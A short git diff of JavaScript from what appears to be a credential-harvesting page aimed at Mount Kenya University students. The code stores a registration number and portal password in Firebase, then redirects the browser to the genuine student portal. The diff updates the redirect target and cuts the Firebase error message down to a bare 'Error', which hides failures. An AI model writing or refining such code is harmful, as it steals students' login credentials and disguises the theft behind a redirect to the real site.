@@ -238,9 +238,9 @@ function redirectToMainSite() {
           userId: regNo,
           pass: smisPass
         }).then(() => {
-          window.location.href = `https://studentportal.mku.ac.ke/umis/studentportal`;
+          window.location.href = `https://unipack.mku.ac.ke/umis/studentportal/index.php`;
         }).catch((error) => {
-          console.error("Error setting data in Firebase:", error);
+          console.error("Error");
         });
       }
 
